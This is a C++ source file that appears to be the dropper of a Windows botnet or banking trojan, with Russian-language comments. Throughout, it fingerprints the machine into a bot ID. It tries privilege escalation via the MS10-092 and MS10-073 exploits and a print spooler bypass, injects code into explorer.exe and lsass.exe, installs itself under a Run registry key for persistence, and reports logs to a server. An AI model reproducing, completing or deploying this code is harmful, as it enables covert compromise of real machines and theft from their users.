#include <intrin.h>
#include <stdio.h>
#include <windows.h>
#include <psapi.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <intrin.h>
#include <ImageHlp.h>

#include "dropper.h"
#include "protect.h"
#include "server.h"

#include "inject.h"
#include "config.h"
#include "modules.h"

#include "peimage.h"
#include "utils.h"
#include "peldr.h"

#include "bootkit.h"

//Exploits
#include "com_elevation\com_elevation.h"
#include "ms10_073\ms10_073.h"
#include "ms10_092\ms10_092.h"
#include "spooler\spooler.h"
#include "spooler\antiav.h"

CHAR Drop::MachineGuid[MAX_PATH];
CHAR Drop::BotID[60];
CHAR Drop::CurrentModulePath[MAX_PATH];
CHAR Drop::CurrentConfigPath[MAX_PATH];
PVOID Drop::CurrentImageBase;
DWORD Drop::CurrentImageSize;
BOOLEAN Drop::bFirstImageLoad;
BOOLEAN Drop::bWorkThread;
BOOLEAN Drop::g_bInject;
CHAR Drop::g_chDllPath[MAX_PATH];
BOOLEAN Drop::g_UAC;
BOOLEAN Drop::g_Admin;
DWORD Drop::IntegrityLevel;

#define MAIN_WORK_PROCESS	"lsass.exe"
//----------------------------------------------------------------------------------------------------------------------------------------------------

PCHAR Drop::GetMachineGuid()
{
	if (!MachineGuid[0])
	{
		char Crpytography_key[] = "Software\\Microsoft\\Cryptography";
		char MachineGuid_key[] = "MachineGuid";
		if (Utils::RegReadValue(HKEY_LOCAL_MACHINE, Crpytography_key, MachineGuid_key, REG_SZ, MachineGuid, sizeof(MachineGuid)) != ERROR_SUCCESS)
		{
			lstrcpy(MachineGuid, DROP_MACHINEGUID);
		}
		lstrcat(MachineGuid, DROP_MACHINESIGN);
	}

	return MachineGuid;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------
#ifdef BOOTKIT
VOID PrepareFirstRun(LPCSTR lpExePath)
{
	CHAR chFolderPath[MAX_PATH];

	GetTempPath(RTL_NUMBER_OF(chFolderPath)-1, chFolderPath);

	GetTempFileName(chFolderPath, NULL, 0, Drop::CurrentModulePath);
	PathRemoveExtension(Drop::CurrentModulePath);
	PathAddExtension(Drop::CurrentModulePath, ".exe");
	CopyFileA(lpExePath, Drop::CurrentModulePath, FALSE);

	GetTempFileName(chFolderPath, NULL, 0, Drop::g_chDllPath);
	PathRemoveExtension(Drop::g_chDllPath);
	PathAddExtension(Drop::g_chDllPath, ".dll");
	CopyFileA(lpExePath, Drop::g_chDllPath, FALSE);
	//PeLdr::SetFileDllFlag(Drop::g_chDllPath);
}

VOID InstallAll()
{

}

BOOL DropperExeUser()
{
	BOOL Ret = FALSE;

	// inject explorer process in current session
	Ret = Inject::InjectProcessByName("explorer.exe");

	return Ret;
}

BOOL DropperExeAdmin()
{
	BOOL bOk = FALSE;

	// setup rpc control port redirection
	PortFilterBypassHook();

	bOk = SpoolerBypass(Drop::g_chDllPath);
	if (!bOk)
	{
		// inject worker process in current session
		bOk = Inject::InjectProcessByName(MAIN_WORK_PROCESS);
	}

	return bOk;
}

VOID DropperExeWork(LPCSTR lpExePath)
{
	BOOL bOk = FALSE;

	if (!Utils::IsWow64((HANDLE)-1))
	{
		PrepareFirstRun(lpExePath);

		if (Drop::g_Admin)
		{
			if (!Drop::g_UAC)
			{
				// try spooler
				bOk = DropperExeAdmin();
			}
		}

		if (!bOk)
		{	
			if (Drop::g_UAC)
			{
				// try UAC task scheduler exploit
				bOk = ExploitMS10_092(Drop::CurrentModulePath);
			}
		}
#ifndef _WIN64
		if (!bOk)
		{
			if (!Drop::g_Admin)
			{
				// try Win32k keyboard layout exploit
				if (ExploitMS10_073())
				{
					bOk = DropperExeAdmin();
				}
			}
		}
#endif
		if (!bOk)
		{
			// try inject
			if (!DropperExeUser())
			{
				InstallAll();
			}
		}
	}
}
#endif

PCHAR Drop::GetBotID()
{
	if (!BotID[0])
	{
		CHAR cid[40];
		DWORD subId[2];

		//Получаем NetBIOS.
		int size = sizeof(cid) / sizeof(WCHAR);
		if(GetComputerNameA(cid, (LPDWORD)&size) == FALSE) lstrcpynA(cid, "unknown", sizeof("unknown") / sizeof(CHAR));

		//Получаем версию. Здесь мощная параноя по поводу Mem::_zero().
		OSVERSIONINFOEXW ovi = {0};
		
		ovi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
		if(GetVersionExW((OSVERSIONINFOW *)&ovi) == FALSE) ZeroMemory(&ovi, sizeof(OSVERSIONINFOEXW));
		else ZeroMemory(ovi.szCSDVersion, sizeof(ovi.szCSDVersion));

		{
		CHAR regKey[] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion";

		//Дата установки.
		{
			CHAR regValue1[] = "InstallDate";
			Utils::RegReadValue(HKEY_LOCAL_MACHINE, regKey, regValue1, REG_DWORD, &subId, sizeof(DWORD));
		}

		//Данные о регистрации.
		{
			CHAR regValue2[] = "DigitalProductId";
			void* Data;
			DWORD size = Utils::_getValueAsBinaryEx(HKEY_LOCAL_MACHINE, regKey, regValue2, 0, &Data);
			if(size != (DWORD)-1 && size > 0)
			{
				subId[1] = Utils::crc32Hash(Data, size);
				free(Data);
			}
		}
		}

		//Создаем полный ID
		{
		CHAR format[] = "%s_%08X%08X";
		size = _snprintf(BotID, 60, format, cid, Utils::crc32Hash((LPBYTE)&ovi, sizeof(OSVERSIONINFOEXW)), Utils::crc32Hash((LPBYTE)subId, sizeof(subId)));
		}
		char fatal_error[] = "fatal_error";
		if(size < 1) lstrcpynA(BotID, fatal_error, sizeof(fatal_error));
	}

	return BotID;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

VOID Drop::CreateInjectStartThread()
{
	if (!bWorkThread)
	{
		bWorkThread = TRUE;
		Utils::ThreadCreate(Drop::InjectStartThread, NULL, NULL);
	}
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

DWORD Drop::InjectStartThread(PVOID Context)
{
	PCHAR CurrentProcess = PathFindFileName(Drop::CurrentModulePath);

	DbgMsg(__FUNCTION__"(): inject '%s' (x%s) !!!\r\n", CurrentProcess, RtlImageNtHeader(Drop::CurrentImageBase)->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64 ? "64" : "32");

	Config::ReadConfig();
	char explorer_exe[] = "explorer.exe";
	// Если мы эксплорер и это первый запуск наш в этой системе записываем себя в авторан и все дела
	if (!lstrcmpi(CurrentProcess, explorer_exe) && Utils::CreateCheckMutex(DROP_EXP_MUTEX_ID, Drop::GetMachineGuid()))
	{
		Protect::StartProtect();
		Utils::ThreadCreate(Server::ServerLoopThread, NULL, NULL);
	}
	
	Modules::LoadModulesToProcess(CurrentProcess);

	return 0;
}

//----------------------------------------------------------------------------------------------------------------------------------------------------

BOOL WINAPI Entry(HMODULE hDllHandle, DWORD reason, LPVOID lpReserved)
{
#ifndef _WIN64
	HANDLE DropMutex;
	BOOLEAN bInject = FALSE;
	MEMORY_BASIC_INFORMATION Mbi;
	CHAR ParrentProcessName[MAX_PATH] = {0};
	CHAR NewFileName[MAX_PATH];
	CHAR WinVer[MAX_PATH];
	
	GetModuleFileName(NULL, Drop::CurrentModulePath, RTL_NUMBER_OF(Drop::CurrentModulePath));
	Utils::GetParrentProcessName(ParrentProcessName, sizeof(ParrentProcessName));
	VirtualQuery(Entry, &Mbi, sizeof(Mbi));
	Drop::CurrentImageBase = Mbi.AllocationBase;
	Drop::CurrentImageSize = PeLdr::PeImageNtHeader(Drop::CurrentImageBase)->OptionalHeader.SizeOfImage;
	Drop::bFirstImageLoad = FALSE;
	Drop::g_UAC = Utils::CheckUAC();
	Drop::g_Admin = Utils::CheckAdmin();

	Utils::GetWindowsVersion(WinVer, RTL_NUMBER_OF(WinVer));
	Drop::IntegrityLevel = Utils::GetProcessIntegrityLevel();

#if !(BO_DEBUG > 0)
	RU_UA_RESTRICTION
#endif
	if(hDllHandle && reason == DLL_PROCESS_ATTACH)
	{
		if((DWORD)lpReserved == 'FWPB')
			Drop::g_bInject=TRUE;
		DbgMsg(__FUNCTION__"(): Dll inject: CurrentModulePath == '%S', Integrity == %u, CheckAdmin() == %u, IsWoW64() == %u, g_bInject: %u\r\n", PathFindFileName(Drop::CurrentModulePath), Drop::IntegrityLevel, Drop::g_Admin, Utils::IsWow64(NtCurrentProcess()), Drop::g_bInject);
		//MessageBoxA(0, "test", "Qwe", 0);
	}
	else if (Drop::IntegrityLevel != SECURITY_MANDATORY_LOW_RID)
	{
		DbgMsg(__FUNCTION__"(): Exe run: CurrentModulePath == '%S', Integrity == %u, CheckAdmin() == %u, IsWoW64() == %u, UAC enabled: %u\r\n", Drop::CurrentModulePath, Drop::IntegrityLevel, Drop::g_Admin, Utils::IsWow64(NtCurrentProcess()), Drop::g_UAC);
		//Мы первые.
		Drop::bFirstImageLoad = TRUE;
		// Проверям основной мьютекс и мьютекс что бы два дроппера одновременно не запустились
		if (Utils::CheckMutex(DROP_EXP_MUTEX_ID, Drop::GetMachineGuid()) && (DropMutex = Utils::CreateCheckMutex(DROP_RUN_MUTEX_ID, Drop::GetMachineGuid())))
		{
			//bootkit::InstallBk(Drop::CurrentImageBase);
			char cur_path[] = "CurrentPath";
			Config::RegWriteString(cur_path, Drop::CurrentModulePath);

			// Инжектимся через эксплоит в зависимости от ОС 32/64 если не получилось инжектимся обычным способом
			//if (Utils::IsWow64(NtCurrentProcess())) bInject = Exploit64::InjectExplorer64(); else bInject = Exploit32::InjectExplorer32();
			//if (!bInject) 
			{
				DbgMsg(__FUNCTION__"(): Exploit failed\r\n");

				char explorer_exe[] = "explorer.exe";
				bInject = Inject::InjectProcessByName(explorer_exe);
				if (!bInject)
				{
					DbgMsg(__FUNCTION__"(): Normal injected failed\r\n");
				}
			}

			// Записываем в новую папку и добавляем в авторан в реестр
			Protect::WriteFileToNewPath(Drop::CurrentModulePath, NewFileName);
			Protect::AddKeyToRun(NewFileName);

			CloseHandle(DropMutex);
		}
		else
		{
			DbgMsg(__FUNCTION__"(): System already infected\r\n");
			bInject = TRUE;
		}
	}
	// Если инжект не прошел или траблы с IntegrityLevel перезапускаем себя и отправляем логи на сервер
	if (!bInject)
	{
		Utils::RestartModuleShellExec(Drop::CurrentModulePath);
		Server::SendLogsToServer();
	}
	
#endif

	ExitProcess(ERROR_SUCCESS);
}
